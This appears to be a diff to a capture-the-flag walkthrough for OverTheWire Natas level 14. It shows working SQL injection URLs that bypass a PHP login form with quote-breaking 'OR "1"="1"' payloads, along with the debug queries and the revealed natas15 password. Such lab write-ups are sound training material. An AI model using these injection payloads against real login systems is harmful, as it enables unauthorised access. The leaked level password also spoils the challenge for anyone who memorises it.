@@ -48,6 +48,7 @@ echo "There are $count users.";
 ## Solution
 ```
 Click View source code
+http://natas14.natas.labs.overthewire.org/index-source.html
 
 <html>
 <head>
@@ -93,26 +94,26 @@ Password: <input name="password"><br>
 </html>
 
 # Useful for seeing what SQL query is sent to database
-http://natas14.natas.labs.overthewire.org/index.php?username=&password=&debug
+http://natas14.natas.labs.overthewire.org/index.php?username=&password=&debug ⌨️
 Executing query: SELECT * from users where username="" and password=""
 Access denied!
 
 # Extra " before: %22, see website administrator forgot to disable PHP error_reporting
-http://natas14.natas.labs.overthewire.org/index.php?username=%22hacker&password=hacker&debug
+http://natas14.natas.labs.overthewire.org/index.php?username=%22hacker&password=hacker&debug ⌨️
 Executing query: SELECT * from users where username=""hacker" and password="hacker"
 
 Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
 Access denied!
 
-http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221&debug
+http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221&debug ⌨️
 Executing query: SELECT * from users where username="hacker" and password="hacker" OR "1"="1"
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐
 
 # Note: Removed debug to see if even needed
-http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221
+http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221 ⌨️
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐
 
-http://natas14.natas.labs.overthewire.org/index.php?username=natas14&password=%22%20OR%20%221%22=%221%22%20--%20
+http://natas14.natas.labs.overthewire.org/index.php?username=natas14&password=%22%20OR%20%221%22=%221%22%20--%20 ⌨️
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐
 ```
 
